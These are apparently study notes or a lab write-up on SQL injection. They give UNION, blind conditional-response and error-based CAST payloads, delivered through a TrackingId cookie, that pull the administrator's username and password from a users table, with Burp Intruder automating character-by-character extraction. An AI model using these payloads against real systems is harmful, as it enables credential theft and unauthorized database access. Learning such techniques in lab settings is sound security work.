# Retrieve multiple values in a single column

### Scenario
Trying to extract administrator's username and password from a table using a UNION injection and putting the two values in a single column.

### Exploit

We can abuse the string concatenation in SQL:

```sql
' UNION SELECT NULL, username || '<->' || password from users -- 
```

# Blind SQL injection with conditional responses

### Scenario

There is a SQL injection point in the "Cookie" request parameter. If the injection is correct we will obtain a "welcome back" messagge. 

### Exploit

With this SQL injection we can confirm the existence of the users table:

```sql
Cookie: TrackingId=ID' AND (SELECT 'a' FROM users LIMIT 1) = 'a'-- 
```
With the following one we can confirm the existence of the user "administrator":

```sql
Cookie: TrackingId=ID' AND (SELECT 'a' FROM users where username= 'administrator') = 'a'-- 
```

With the following one we can confirm the existence of the user "administrator" and try to find out the length of the associated password:

```sql
Cookie: TrackingId=ID' AND (SELECT 'a' FROM users where username= 'administrator' AND LENGTH(password) > 1) = 'a'-- 
```

**We can use Burp Intruder to increment automatically the value of the length in the request**.


Using Burp we found that the password length is exactly 20 chars.

We can use **"SUBSTRING()" SQL funciton** which extract part of a string contained in a DB. This takes three parameters: name of the column, starting point location in the string (with the starting point that is 1 and not 0), number of chars after the starting location.

We are trying to check if the first char of the password of admin user is equal to 'a':

```sql
Cookie: TrackingId=ID' AND (SELECT SUBSTRING(password, 1, 1) FROM users where username= 'administrator') = 'a'-- 
```

Another time, we can use Burp intruder to automate this check and than pass to the next chars.

# Visible error-based (not at all) BLIND SQL injection

### Scenario
We are in a situation in which we noticed that the there is a possible SQL injection in the "cookie" paramenter of the GET request.
We also noticed that if we force an error on the database, an error message is printed on the web pages, this is **a potential information leakege**. We want to exploit it to retrieve the administrator username and password from the table "users".

### Exploit
```sql
Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users where username= 'administrator') AS INT) -- 
```

Or:
```sql
Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT) -- 
```